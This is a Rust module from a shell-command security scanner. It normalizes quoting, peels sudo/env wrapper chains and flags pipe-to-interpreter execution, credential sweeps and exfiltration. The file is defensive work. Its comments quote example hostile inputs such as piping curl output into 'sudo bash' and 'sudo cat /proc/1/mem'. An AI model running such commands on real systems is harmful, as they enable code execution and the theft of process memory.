use once_cell::sync::Lazy;
use regex::Regex;

use crate::extract::ScanContext;
use crate::redact;
use crate::tokenize::{self, ShellType};
use crate::verdict::{Evidence, Finding, RuleId, Severity};

/// Canonical list of known interpreters (lowercase).
/// Used by `is_interpreter()` and validated against tier-1 regex by drift test.
pub const INTERPRETERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "fish",
    "csh",
    "tcsh",
    "ash",
    "mksh",
    "python",
    "python2",
    "python3",
    "node",
    "deno",
    "bun",
    "perl",
    "ruby",
    "php",
    "lua",
    "tclsh",
    "elixir",
    "rscript",
    "pwsh",
    "iex",
    "invoke-expression",
    "cmd",
];

/// Maximum wrapper-chain recursion depth for the `uses_sudo` walk
/// (`segment_chain_contains_sudo` and friends). tirith scans untrusted command
/// strings, so a hostile input like `env env env … sudo bash` (or a nested
/// `env -S "env -S \"…\""` payload) must not recurse without bound and overflow
/// the stack. Real wrapper chains are 1-3 deep; 32 is far beyond any legitimate
/// command, so the round-3/8/9 wrapped-sudo cases are unaffected. Exhausting the
/// budget returns `false` (give up the sudo-leader search) — the safe,
/// conservative answer (`uses_sudo` may be false for an absurdly-nested command,
/// which is acceptable vs. a crash). Mirrors the iterative token budget in
/// [`resolve_with_parser`].
const MAX_WRAPPER_DEPTH: usize = 32;

/// `sudo` flags that consume a following value (so the next arg is NOT the
/// command). Single source of truth shared by every sudo flag-skip
/// ([`resolve_base_sudo`], [`unwrap_one_wrapper_segment`]).
const SUDO_VALUE_SHORT_FLAGS: &[&str] = &["-u", "-g", "-C", "-D", "-R", "-T"];
const SUDO_VALUE_LONG_FLAGS: &[&str] = &[
    "--user",
    "--group",
    "--close-from",
    "--chdir",
    "--role",
    "--type",
    "--other-user",
    "--host",
    "--timeout",
];

/// `env` flags that consume a following value. `-S` / `--split-string` are
/// handled separately (their value is a command string, not a positional).
/// Shared by [`resolve_base_env`] and [`unwrap_one_wrapper_segment`].
const ENV_VALUE_SHORT_FLAGS: &[&str] = &["-u", "-C"];
const ENV_VALUE_LONG_FLAGS: &[&str] = &[
    "--unset",
    "--chdir",
    "--split-string",
    "--block-signal",
    "--default-signal",
    "--ignore-signal",
];

/// Parse up to `max_digits` from `chars[*i..]` matching `predicate`, interpret as
/// base-`radix`, and return the corresponding char. Advances `*i` past consumed digits.
/// Zero heap allocations — uses a fixed stack buffer.
fn parse_numeric_escape(
    chars: &[char],
    i: &mut usize,
    max_digits: usize,
    radix: u32,
    predicate: fn(&char) -> bool,
) -> Option<char> {
    let mut buf = [0u8; 8];
    let mut n = 0;
    for _ in 0..max_digits {
        if *i < chars.len() && predicate(&chars[*i]) {
            buf[n] = chars[*i] as u8;
            n += 1;
            *i += 1;
        } else {
            break;
        }
    }
    if n == 0 {
        return None;
    }
    let s = std::str::from_utf8(&buf[..n]).ok()?;
    let val = u32::from_str_radix(s, radix).ok()?;
    char::from_u32(val)
}

/// Strip all shell quoting/escaping from a token, producing the effective string
/// the shell would see after expansion.
///
/// Handles: single quotes, double quotes, ANSI-C quoting (`$'...'`), backslash
/// escaping (POSIX) and backtick escaping (PowerShell).
pub(crate) fn normalize_shell_token(input: &str, shell: ShellType) -> String {
    #[derive(PartialEq)]
    enum QState {
        Normal,
        Single,
        Double,
        AnsiC,
    }

    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut out = String::with_capacity(len);
    let mut i = 0;
    let is_ps = matches!(shell, ShellType::PowerShell);
    let is_cmd = matches!(shell, ShellType::Cmd);
    let mut state = QState::Normal;

    while i < len {
        match state {
            QState::Normal => {
                let ch = chars[i];
                if is_cmd && ch == '^' && i + 1 < len {
                    // Cmd caret escape: skip caret, take next char literal
                    out.push(chars[i + 1]);
                    i += 2;
                } else if !is_ps && !is_cmd && ch == '\\' && i + 1 < len {
                    // POSIX backslash escape: skip backslash, take next char literal
                    out.push(chars[i + 1]);
                    i += 2;
                } else if is_ps && ch == '`' && i + 1 < len {
                    // PowerShell backtick escape
                    out.push(chars[i + 1]);
                    i += 2;
                } else if ch == '\'' && !is_cmd {
                    state = QState::Single;
                    i += 1;
                } else if ch == '"' {
                    state = QState::Double;
                    i += 1;
                } else if shell == ShellType::Posix
                    && ch == '$'
                    && i + 1 < len
                    && chars[i + 1] == '\''
                {
                    state = QState::AnsiC;
                    i += 2;
                } else {
                    out.push(ch);
                    i += 1;
                }
            }
            QState::Single => {
                if chars[i] == '\'' {
                    // PowerShell: '' inside single quotes is an escaped literal '
                    if is_ps && i + 1 < len && chars[i + 1] == '\'' {
                        out.push('\'');
                        i += 2;
                    } else {
                        state = QState::Normal;
                        i += 1;
                    }
                } else {
                    out.push(chars[i]);
                    i += 1;
                }
            }
            QState::Double => {
                if chars[i] == '"' {
                    state = QState::Normal;
                    i += 1;
                } else if is_cmd && chars[i] == '^' && i + 1 < len {
                    // Cmd caret escaping is still active inside double quotes.
                    out.push(chars[i + 1]);
                    i += 2;
                } else if !is_ps && chars[i] == '\\' && i + 1 < len {
                    // POSIX: only \", \\, \$, \` are special inside double quotes
                    let next = chars[i + 1];
                    if next == '"' || next == '\\' || next == '$' || next == '`' {
                        out.push(next);
                        i += 2;
                    } else {
                        // literal backslash
                        out.push('\\');
                        out.push(next);
                        i += 2;
                    }
                } else if is_ps && chars[i] == '`' && i + 1 < len {
                    // PowerShell backtick escape inside double quotes
                    out.push(chars[i + 1]);
                    i += 2;
                } else {
                    out.push(chars[i]);
                    i += 1;
                }
            }
            QState::AnsiC => {
                if chars[i] == '\'' {
                    state = QState::Normal;
                    i += 1;
                } else if chars[i] == '\\' && i + 1 < len {
                    let esc = chars[i + 1];
                    match esc {
                        'n' => {
                            out.push('\n');
                            i += 2;
                        }
                        't' => {
                            out.push('\t');
                            i += 2;
                        }
                        'r' => {
                            out.push('\r');
                            i += 2;
                        }
                        '\\' => {
                            out.push('\\');
                            i += 2;
                        }
                        '\'' => {
                            out.push('\'');
                            i += 2;
                        }
                        '"' => {
                            out.push('"');
                            i += 2;
                        }
                        'a' => {
                            out.push('\x07');
                            i += 2;
                        }
                        'b' => {
                            out.push('\x08');
                            i += 2;
                        }
                        'e' | 'E' => {
                            out.push('\x1b');
                            i += 2;
                        }
                        'f' => {
                            out.push('\x0c');
                            i += 2;
                        }
                        'v' => {
                            out.push('\x0b');
                            i += 2;
                        }
                        'x' => {
                            // \xHH — 1 or 2 hex digits
                            i += 2;
                            if let Some(c) =
                                parse_numeric_escape(&chars, &mut i, 2, 16, char::is_ascii_hexdigit)
                            {
                                out.push(c);
                            }
                        }
                        'u' => {
                            // \uHHHH — 1 to 4 hex digits
                            i += 2;
                            if let Some(c) =
                                parse_numeric_escape(&chars, &mut i, 4, 16, char::is_ascii_hexdigit)
                            {
                                out.push(c);
                            }
                        }
                        'U' => {
                            // \UHHHHHHHH — 1 to 8 hex digits
                            i += 2;
                            if let Some(c) =
                                parse_numeric_escape(&chars, &mut i, 8, 16, char::is_ascii_hexdigit)
                            {
                                out.push(c);
                            }
                        }
                        c if c.is_ascii_digit() && c <= '7' => {
                            // \NNN octal — 1 to 3 octal digits
                            i += 1; // skip backslash
                            if let Some(c) = parse_numeric_escape(&chars, &mut i, 3, 8, |c| {
                                c.is_ascii_digit() && *c <= '7'
                            }) {
                                out.push(c);
                            }
                        }
                        _ => {
                            // Unknown escape: emit literal
                            out.push('\\');
                            out.push(esc);
                            i += 2;
                        }
                    }
                } else {
                    out.push(chars[i]);
                    i += 1;
                }
            }
        }
    }
    out
}

/// Extract the effective command base name from a raw token.
///
/// Normalize → path basename → first word → lowercase → strip .exe
pub(crate) fn normalize_cmd_base(raw: &str, shell: ShellType) -> String {
    let normalized = normalize_shell_token(raw.trim(), shell);
    basename_from_normalized(&normalized, shell)
}

/// Extract basename from an already-normalized (unquoted) string.
/// Handles path separators, first-word extraction, lowercasing, and .exe stripping.
fn basename_from_normalized(normalized: &str, shell: ShellType) -> String {
    let has_path_sep = match shell {
        ShellType::PowerShell | ShellType::Cmd => {
            normalized.contains('/') || normalized.contains('\\')
        }
        _ => normalized.contains('/'),
    };
    let after_path = if has_path_sep {
        match shell {
            ShellType::PowerShell | ShellType::Cmd => {
                normalized.rsplit(['/', '\\']).next().unwrap_or(normalized)
            }
            _ => normalized.rsplit('/').next().unwrap_or(normalized),
        }
    } else {
        normalized
    };
    let first_word = after_path.split_whitespace().next().unwrap_or("");
    let lower = first_word.to_lowercase();
    if lower.ends_with(".exe") {
        lower[..lower.len() - 4].to_string()
    } else {
        lower
    }
}

fn is_interpreter(cmd: &str) -> bool {
    INTERPRETERS.contains(&cmd)
}

/// Run command-shape rules.
pub fn check(
    input: &str,
    shell: ShellType,
    cwd: Option<&str>,
    scan_context: ScanContext,
) -> Vec<Finding> {
    let mut findings = Vec::new();
    let segments = tokenize::tokenize(input, shell);

    let has_pipe = segments.iter().any(|s| {
        s.preceding_separator.as_deref() == Some("|")
            || s.preceding_separator.as_deref() == Some("|&")
    });
    if has_pipe {
        check_pipe_to_interpreter(&segments, shell, &mut findings);
    }

    // source/. reuse transport rules because they execute the fetched body.
    for segment in &segments {
        if let Some(ref cmd) = segment.command {
            let cmd_base = normalize_cmd_base(cmd, shell);
            if is_source_command(&cmd_base) {
                let tls_findings =
                    crate::rules::transport::check_insecure_flags(&segment.args, true);
                findings.extend(tls_findings);
            }
        }
    }

    check_dotfile_overwrite(&segments, &mut findings);
    check_archive_extract(&segments, &mut findings);
    check_proc_mem_access(&segments, shell, &mut findings);
    check_docker_remote_privesc(&segments, shell, &mut findings);
    check_credential_file_sweep(&segments, shell, scan_context, &mut findings);

    if scan_context == ScanContext::Exec {
        check_vet_not_configured(&segments, cwd, &mut findings);
    }

    check_env_var_in_command(&segments, &mut findings);
    check_network_destination(&segments, &mut findings);
    check_base64_decode_execute(&segments, shell, &mut findings);
    check_data_exfiltration(&segments, shell, &mut findings);

    findings
}

/// Command-shape facts the M13 ch4 custom-rule DSL needs, derived by REUSING
/// the same pipeline/sudo resolution the `pipe_to_interpreter` and sudo rules
/// use ([`resolve_interpreter_name`], [`resolve_base_through_wrappers`]).
///
/// * `pipeline_targets` — lowercase interpreter names that appear as the
///   right-hand side of a `|` / `|&` pipeline, sudo/env/wrapper-resolved (so
///   `curl … | sudo bash` yields `bash`). This is exactly what the
///   `command.has_pipeline_to` predicate matches.
/// * `uses_sudo` — any segment whose resolved leader (through env/command/exec/
///   nohup wrappers) is `sudo`. Drives `command.uses_sudo`.
pub struct CommandFacts {
    pub pipeline_targets: Vec<String>,
    pub uses_sudo: bool,
}

/// Extract [`CommandFacts`] from a command string for the custom-rule DSL.
pub fn extract_command_facts(input: &str, shell: ShellType) -> CommandFacts {
    let segments = tokenize::tokenize(input, shell);

    let mut pipeline_targets = Vec::new();
    for (i, seg) in segments.iter().enumerate() {
        if i == 0 {
            continue;
        }
        let is_pipe = seg
            .preceding_separator
            .as_deref()
            .is_some_and(|s| s == "|" || s == "|&");
        if is_pipe {
            // `resolve_interpreter_name` now unwraps `env -S "…"` /
            // `env --split-string=…` pipeline targets itself, so a wrapped
            // interpreter (`… | env -S "sudo bash -c id"`) still resolves to its
            // real leader (`bash`), matching the built-in pipe-to-shell detectors
            // (CodeRabbit M13 findings R8-2 / R9-3 — the unwrap lives in exactly
            // one place now).
            if let Some(interp) = resolve_interpreter_name(seg, shell) {
                if !pipeline_targets.contains(&interp) {
                    pipeline_targets.push(interp);
                }
            }
        }
    }

    // `sudo` appearing as a leader ANYWHERE in the wrapper chain. The previous
    // check only caught a bare `sudo` leader or a chain whose FINAL base was
    // `sudo`, so `env sudo bash`, `command sudo apt`, and `env -S "sudo bash"`
    // (where sudo sits BETWEEN the wrapper and the real command) were missed
    // (CodeRabbit M13 finding R6). `segment_chain_contains_sudo` peels the same
    // env/command/exec/nohup wrappers `resolve_base_through_wrappers` does and
    // returns true if `sudo` is any link in that chain.
    let uses_sudo = segments
        .iter()
        .any(|seg| segment_chain_contains_sudo(seg, shell, MAX_WRAPPER_DEPTH));

    CommandFacts {
        pipeline_targets,
        uses_sudo,
    }
}

/// `true` when `sudo` appears as a leader at ANY level of `seg`'s wrapper
/// chain (`sudo …`, `env sudo …`, `command sudo …`, `env -S "sudo …"`, nested
/// combinations). Peels the same env/command/exec/nohup wrappers as
/// [`resolve_base_through_wrappers`] but reports presence rather than the final
/// base, so a `sudo` sandwiched between a wrapper and the real command is still
/// detected (CodeRabbit M13 finding R6).
fn segment_chain_contains_sudo(seg: &tokenize::Segment, shell: ShellType, depth: usize) -> bool {
    // Bound the wrapper-chain recursion: a hostile, absurdly-nested input
    // (`env env … sudo bash`, nested `env -S "env -S \"…\""`) must not overflow
    // the stack. Exhausting the budget gives up the search (returns `false`),
    // the safe/conservative answer.
    if depth == 0 {
        return false;
    }
    // `env -S "sudo bash"` / `env --split-string=...`: the wrapped command
    // lives inside a single string token. Unwrap it into a fresh segment first,
    // then fall through to the normal leader/wrapper walk.
    if let Some(inner) = unwrap_env_split_string_segment(seg, shell) {
        if segment_chain_contains_sudo(&inner, shell, depth - 1) {
            return true;
        }
    }

    let Some(ref cmd) = seg.command else {
        return false;
    };
    let cmd_base = normalize_cmd_base(cmd, shell);
    if cmd_base == "sudo" {
        return true;
    }
    match cmd_base.as_str() {
        "env" => args_chain_contains_sudo_env(&seg.args, shell, depth - 1),
        "command" | "exec" | "nohup" => {
            args_chain_contains_sudo_wrapper(&seg.args, &cmd_base, shell, depth - 1)
        }
        _ => false,
    }
}

/// Given a slice whose FIRST token is a wrapped command (the positional that
/// follows a wrapper's flags, or the tail after a `--` separator), report
/// whether that command's wrapper chain contains `sudo`. Dispatches the first
/// token through the same env/command/exec/nohup peeling as
/// [`segment_chain_contains_sudo`], so nested wrappers after a `--`
/// (`command -- env sudo bash`, `env -- command sudo bash`) still resolve —
/// not just a bare `sudo` immediately after the separator (CodeRabbit M13
/// finding R6 round 3).
fn positional_chain_contains_sudo(args: &[String], shell: ShellType, depth: usize) -> bool {
    if depth == 0 {
        return false;
    }
    let Some(first) = args.first() else {
        return false;
    };
    let base = normalize_cmd_base(first, shell);
    if base == "sudo" {
        return true;
    }
    match base.as_str() {
        "env" => args_chain_contains_sudo_env(&args[1..], shell, depth - 1),
        "command" | "exec" | "nohup" => {
            args_chain_contains_sudo_wrapper(&args[1..], &base, shell, depth - 1)
        }
        _ => false,
    }
}

/// Walk an `env` wrapper's args (mirroring [`resolve_base_env`]'s flag/assign
/// skipping) and report whether the wrapped command is/contains `sudo`.
fn args_chain_contains_sudo_env(args: &[String], shell: ShellType, depth: usize) -> bool {
    if depth == 0 {
        return false;
    }
    let value_short_flags = ["-u", "-C"];
    let value_long_flags = [
        "--unset",
        "--chdir",
        "--block-signal",
        "--default-signal",
        "--ignore-signal",
    ];
    let mut idx = 0;
    while idx < args.len() {
        let normalized = normalize_shell_token(args[idx].trim(), shell);
        if normalized == "--" {
            // Everything after `--` is the wrapped command; recurse through the
            // wrapper chain (`env -- command sudo bash`), not just the immediate
            // next token (R6 round 3).
            return positional_chain_contains_sudo(&args[idx + 1..], shell, depth - 1);
        }
        // `env -S "sudo …"` / `--split-string` carry the command as a string.
        if normalized == "-S" || normalized == "--split-string" {
            return args
                .get(idx + 1)
                .map(|c| command_string_chain_contains_sudo(c, shell, depth - 1))
                .unwrap_or(false);
        }
        if let Some(val) = normalized.strip_prefix("--split-string=") {
            return command_string_chain_contains_sudo(val, shell, depth - 1);
        }
        if normalized.starts_with("--") {
            if value_long_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized.starts_with('-') {
            if value_short_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        // env VAR=VALUE assignment — not the command itself.
        if normalized.contains('=') {
            idx += 1;
            continue;
        }
        // First positional is the wrapped command. Recurse so nested wrappers
        // (e.g. `env command sudo …`) still resolve.
        return positional_chain_contains_sudo(&args[idx..], shell, depth - 1);
    }
    false
}

/// Walk a `command`/`exec`/`nohup` wrapper's args (mirroring
/// [`resolve_base_wrapper`]) and report whether the wrapped command
/// is/contains `sudo`.
fn args_chain_contains_sudo_wrapper(
    args: &[String],
    wrapper: &str,
    shell: ShellType,
    depth: usize,
) -> bool {
    if depth == 0 {
        return false;
    }
    let value_flags: &[&str] = match wrapper {
        "exec" => &["-a"],
        _ => &[],
    };
    let mut idx = 0;
    while idx < args.len() {
        let normalized = normalize_shell_token(args[idx].trim(), shell);
        if normalized == "--" {
            // Everything after `--` is the wrapped command; recurse through the
            // wrapper chain (`command -- env sudo bash`), not just the immediate
            // next token (R6 round 3).
            return positional_chain_contains_sudo(&args[idx + 1..], shell, depth - 1);
        }
        if normalized.starts_with("--") || normalized.starts_with('-') {
            if value_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        return positional_chain_contains_sudo(&args[idx..], shell, depth - 1);
    }
    false
}

/// Tokenize a command-string argument (the body of `env -S "…"`) and report
/// whether ANY of its segments' wrapper chains contain `sudo`.
///
/// The payload is run back through the SAME env/generic wrapper resolution the
/// rest of the file uses ([`segment_chain_contains_sudo`] per parsed segment)
/// rather than unwrapped to a single leading segment. Taking only `.first()`
/// missed split-string forms whose leader is an env-assignment prefix or a
/// nested wrapper — `env -S "FOO=1 sudo bash"` (the tokenizer strips the leading
/// `FOO=1` so the segment leader IS `sudo`) and `env -S "env -S 'sudo bash -c
/// id'"` (the inner `env -S` re-enters this walk) — so `command.uses_sudo` and
/// the pipe-to-interpreter facts went false-negative (CodeRabbit M13 round-15
/// R15-3). The round-13 `MAX_WRAPPER_DEPTH` budget is preserved by threading
/// `depth` into every per-segment walk, so an absurdly-nested payload still
/// terminates.
fn command_string_chain_contains_sudo(command: &str, shell: ShellType, depth: usize) -> bool {
    if depth == 0 {
        return false;
    }
    let normalized = normalize_shell_token(command.trim(), shell);
    if normalized.is_empty() {
        return false;
    }
    tokenize::tokenize(&normalized, shell)
        .iter()
        .any(|seg| segment_chain_contains_sudo(seg, shell, depth - 1))
}

/// Index of the first *positional* token (the wrapped command) in a wrapper's
/// arg list, after skipping that wrapper's option flags / `VAR=VALUE`
/// assignments and honoring `--`. Returns `None` when the wrapper carries no
/// positional command, or when the wrapper is an `env` *split-string* form
/// (`-S` / `--split-string`) — those pack the command into a quoted value and
/// are peeled by [`unwrap_env_split_string_segment`], not by positional slicing.
///
/// Shares the sudo/env flag tables ([`SUDO_VALUE_*`], [`ENV_VALUE_*`]) with the
/// base resolvers so flag semantics cannot drift between the two peel paths.
fn wrapper_first_positional_index(
    wrapper: &str,
    args: &[String],
    shell: ShellType,
) -> Option<usize> {
    let (value_short, value_long): (&[&str], &[&str]) = match wrapper {
        "sudo" => (SUDO_VALUE_SHORT_FLAGS, SUDO_VALUE_LONG_FLAGS),
        "env" => (ENV_VALUE_SHORT_FLAGS, ENV_VALUE_LONG_FLAGS),
        "exec" => (&["-a"], &[]),
        // command / nohup take no value-bearing flags.
        _ => (&[], &[]),
    };
    let is_env = wrapper == "env";

    let mut idx = 0;
    while idx < args.len() {
        let normalized = normalize_shell_token(args[idx].trim(), shell);
        if normalized == "--" {
            // Everything after `--` is the command; first such token is positional.
            return (idx + 1 < args.len()).then_some(idx + 1);
        }
        // env split-string: not a positional command — defer to the env-S peeler.
        if is_env && (normalized == "-S" || normalized == "--split-string") {
            return None;
        }
        if is_env && normalized.starts_with("--split-string=") {
            return None;
        }
        if normalized.starts_with("--") {
            if value_long.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized.starts_with('-') && normalized != "-" {
            if value_short.iter().any(|f| normalized == *f)
                // sudo combined short flags (e.g. `-iu`): last letter may take a value.
                || (wrapper == "sudo"
                    && normalized.len() > 2
                    && value_short.iter().any(|f| normalized.ends_with(&f[1..])))
            {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        // env VAR=VALUE assignments precede the command.
        if is_env && normalized.contains('=') {
            idx += 1;
            continue;
        }
        return Some(idx);
    }
    None
}

/// Peel ONE wrapper layer from `seg`, returning the inner command as a synthetic
/// [`tokenize::Segment`] (the wrapped command + its args). Handles the generic
/// wrappers (`sudo`/`env`/`command`/`exec`/`nohup`) via positional slicing and
/// the `env -S` / `--split-string` split-string form via
/// [`unwrap_env_split_string_segment`]. Returns `None` when `seg` is not a
/// wrapper (or carries no inner command).
///
/// Used by [`resolve_interpreter_name`]'s bounded peel loop so that an
/// `env -S "…"` nested BEHIND another wrapper (`sudo env -S "sudo bash -c id"`)
/// is reached and its payload's own wrapper chain resolved — the single env-S
/// peel alone never fired because the leading segment was `sudo`, not `env`
/// (CodeRabbit M13 round-21 F2).
fn unwrap_one_wrapper_segment(
    seg: &tokenize::Segment,
    shell: ShellType,
) -> Option<tokenize::Segment> {
    let cmd = seg.command.as_ref()?;
    let cmd_base = normalize_cmd_base(cmd, shell);

    // env split-string form is peeled to its payload's leading segment.
    if cmd_base == "env" {
        if let Some(inner) = unwrap_env_split_string_segment(seg, shell) {
            return Some(inner);
        }
    }

    if !matches!(
        cmd_base.as_str(),
        "sudo" | "env" | "command" | "exec" | "nohup"
    ) {
        return None;
    }

    let p = wrapper_first_positional_index(&cmd_base, &seg.args, shell)?;
    let inner_cmd = seg.args.get(p)?;
    let inner_args = seg.args[p + 1..].to_vec();
    Some(tokenize::Segment {
        raw: seg.args[p..].join(" "),
        command: Some(inner_cmd.clone()),
        args: inner_args,
        preceding_separator: None,
        byte_range: 0..0,
    })
}

/// Resolve the effective interpreter from a segment, handling all quoting forms,
/// wrappers (sudo, env, command, exec, nohup), subshells, and brace groups.
fn resolve_interpreter_name(seg: &tokenize::Segment, shell: ShellType) -> Option<String> {
    // Peel wrapper layers so a wrapped interpreter resolves to its real leader
    // for EVERY caller — the built-in `CurlPipeShell`/`PipeToInterpreter` /
    // base64-pipe detectors and the custom-rule DSL pipeline-fact extractor alike.
    //
    // [`unwrap_one_wrapper_segment`] peels ONE layer per iteration, handling BOTH
    // the `env -S "…"` / `--split-string=…` split-string form (so
    // `env -S "sudo bash -c id"` resolves to `bash`, not the leading `sudo` —
    // CodeRabbit M13 R9-3) AND a generic `sudo`/`env`/`command`/`exec`/`nohup`
    // wrapper. Peeling generic wrappers here (not just env-S) is what lets an
    // `env -S "…"` nested BEHIND another wrapper be reached: `sudo env -S
    // "sudo bash -c id"` peels `sudo` → `env -S "…"` → `sudo bash …` → `bash`
    // (CodeRabbit M13 round-21 F2). Without it the loop saw a `sudo` leader,
    // never peeled the inner env-S, and `resolve_env_args` missed the wrapped
    // interpreter.
    //
    // The loop is BOUNDED by the same `MAX_WRAPPER_DEPTH` budget the wrapper-chain
    // resolvers use (one decrement per peel), so an absurdly-nested chain — env-S
    // or generic — cannot spin unbounded (it would otherwise reintroduce the
    // round-13 DoS / round-20 nested-env-S blowup). Falls through to the raw
    // `seg` when no further wrapper layer can be peeled.
    let mut current: Option<tokenize::Segment> = None;
    let mut budget = MAX_WRAPPER_DEPTH;
    while budget > 0 {
        let probe = current.as_ref().unwrap_or(seg);
        match unwrap_one_wrapper_segment(probe, shell) {
            Some(inner) => current = Some(inner),
            None => break,
        }
        budget -= 1;
    }
    let seg = current.as_ref().unwrap_or(seg);

    if let Some(ref cmd) = seg.command {
        let cmd_base = normalize_cmd_base(cmd, shell);

        if is_interpreter(&cmd_base) {
            return Some(cmd_base);
        }

        // Subshell: (bash -c '...') tokenizes with parens glued to the command.
        let stripped = cmd_base.trim_start_matches('(').trim_end_matches(')');
        if stripped != cmd_base && is_interpreter(stripped) {
            return Some(stripped.to_string());
        }

        // Brace group: { cmd; } — the interpreter sits in the first arg.
        if cmd_base == "{" {
            return resolve_from_args(&seg.args, shell);
        }

        match cmd_base.as_str() {
            "sudo" => return resolve_sudo_args(&seg.args, shell),
            "env" => return resolve_env_args(&seg.args, shell),
            "command" | "exec" | "nohup" => {
                return resolve_wrapper_args(&seg.args, &cmd_base, shell);
            }
            _ => {}
        }
    }
    None
}

/// Resolve the base command from a segment, stripping sudo/env/command/nohup/exec wrappers.
/// Returns the normalized base command name (lowercase, .exe stripped).
/// Unlike `resolve_interpreter_name`, this returns ANY command — not just interpreters.
fn resolve_base_through_wrappers(seg: &tokenize::Segment, shell: ShellType) -> String {
    resolve_base_through_wrappers_depth(seg, shell, MAX_WRAPPER_DEPTH)
}

/// Depth-bounded core of [`resolve_base_through_wrappers`]. tirith scans untrusted
/// command strings, so a hostile, absurdly-nested wrapper chain (`env env … bash`,
/// nested `env -S "env -S \"…\""`) must not recurse without bound and overflow the
/// stack. The budget starts at [`MAX_WRAPPER_DEPTH`] and decrements on every
/// wrapper/env/command-string recursion; at 0 we stop unwrapping and return the
/// current leader base — the conservative answer (mirrors the budget in
/// [`segment_chain_contains_sudo`] / [`resolve_with_parser`]).
fn resolve_base_through_wrappers_depth(
    seg: &tokenize::Segment,
    shell: ShellType,
    depth: usize,
) -> String {
    let Some(ref cmd) = seg.command else {
        return String::new();
    };
    let cmd_base = normalize_cmd_base(cmd, shell);

    // Out of budget: stop unwrapping and report the current leader base.
    if depth == 0 {
        return cmd_base;
    }

    match cmd_base.as_str() {
        "sudo" => resolve_base_sudo(&seg.args, shell, depth - 1).unwrap_or(cmd_base),
        "env" => resolve_base_env(&seg.args, shell, depth - 1).unwrap_or(cmd_base),
        "command" | "exec" | "nohup" => {
            resolve_base_wrapper(&seg.args, &cmd_base, shell, depth - 1).unwrap_or(cmd_base)
        }
        _ => cmd_base,
    }
}

/// Resolve the base command from a positional arg list whose FIRST element is
/// the command to run (the rest are its args). If that command is itself a
/// wrapper (`sudo`/`env`/`command`/`exec`/`nohup`), recurse into it so the chain
/// keeps peeling; otherwise the first element IS the base.
///
/// This is the shared tail used by every base resolver after it has skipped the
/// wrapper's own flags, AND by the end-of-options (`--`) branch — the token
/// after `--` is the command to run, which may itself be another wrapper, so it
/// must be resolved through this same recursion rather than returned verbatim
/// (CodeRabbit M13 round-21 F1: `command -- sudo cat /proc/1/mem` was reported
/// as `sudo`, hiding the real `cat`). The `depth` budget is shared with the
/// caller and decrements on every wrapper peel, so a `command -- command -- …`
/// chain terminates at [`MAX_WRAPPER_DEPTH`] instead of recursing unbounded.
fn resolve_base_from_positional(args: &[String], shell: ShellType, depth: usize) -> Option<String> {
    if depth == 0 {
        return None;
    }
    let first = args.first()?;
    let base = normalize_cmd_base(first, shell);
    match base.as_str() {
        "sudo" => resolve_base_sudo(&args[1..], shell, depth - 1),
        "env" => resolve_base_env(&args[1..], shell, depth - 1),
        "command" | "exec" | "nohup" => resolve_base_wrapper(&args[1..], &base, shell, depth - 1),
        _ => Some(base),
    }
}

/// Resolve base command through sudo wrapper.
fn resolve_base_sudo(args: &[String], shell: ShellType, depth: usize) -> Option<String> {
    if depth == 0 {
        return None;
    }
    let value_short_flags = SUDO_VALUE_SHORT_FLAGS;
    let value_long_flags = SUDO_VALUE_LONG_FLAGS;
    let mut idx = 0;
    while idx < args.len() {
        let normalized = normalize_shell_token(args[idx].trim(), shell);
        if normalized == "--" {
            // The token after `--` is the command to run; resolve its own
            // wrapper chain (it may be `sudo`/`env`/`command …`) rather than
            // returning it verbatim (round-21 F1).
            return resolve_base_from_positional(&args[idx + 1..], shell, depth);
        }
        if normalized.starts_with("--") {
            if value_long_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized.starts_with('-') {
            if value_short_flags.iter().any(|f| normalized == *f)
                || (normalized.len() > 2
                    && value_short_flags
                        .iter()
                        .any(|f| normalized.ends_with(&f[1..])))
            {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        // First positional is the command — recurse so nested sudo/env/etc still resolves.
        return resolve_base_from_positional(&args[idx..], shell, depth);
    }
    None
}

/// Resolve base command through env wrapper.
fn resolve_base_env(args: &[String], shell: ShellType, depth: usize) -> Option<String> {
    if depth == 0 {
        return None;
    }
    let value_short_flags = ENV_VALUE_SHORT_FLAGS;
    let value_long_flags = ENV_VALUE_LONG_FLAGS;
    let mut idx = 0;
    while idx < args.len() {
        let normalized = normalize_shell_token(args[idx].trim(), shell);
        if normalized == "--" {
            // `env -- cmd …`: the token after `--` is the command to run; resolve
            // its own wrapper chain rather than returning it verbatim (round-21 F1).
            return resolve_base_from_positional(&args[idx + 1..], shell, depth);
        }
        if normalized.starts_with("--") {
            if normalized == "--split-string" {
                if idx + 1 < args.len() {
                    return resolve_base_from_command_string(&args[idx + 1], shell, depth - 1);
                }
                return None;
            }
            if let Some(val) = normalized.strip_prefix("--split-string=") {
                return resolve_base_from_command_string(val, shell, depth - 1);
            }
            if value_long_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        if normalized == "-S" {
            if idx + 1 < args.len() {
                return resolve_base_from_command_string(&args[idx + 1], shell, depth - 1);
            }
            return None;
        }
        if normalized.starts_with('-') {
            if value_short_flags.iter().any(|f| normalized == *f) {
                idx += 2;
            } else {
                idx += 1;
            }
            continue;
        }
        // env VAR=VALUE assignments — not the command itself.
        if normalized.contains('=') {
            idx += 1;
            continue;
        }
        // First positional is the command — recurse so nested sudo/env/etc still resolves.
        return resolve_base_from_positional(&args[idx..], shell, depth);
    }
    None
}

fn resolve_base_from_command_string(
    command: &str,
    shell: ShellType,
    depth: usize,
) -> Option<String> {
    if depth == 0 {
        return None;
    }
    let normalized = normalize_shell_token(command.trim(), shell);
    if normalized.is_empty() {
        return None;
    }

    let segments = tokenize::tokenize(&normalized, shell);
    let first = segments.first()?;
    let base = resolve_base_through_wrappers_depth(first, shell, depth - 1);
    if base.is_empty() {
        None
    } else {
        Some(base)
    }
}
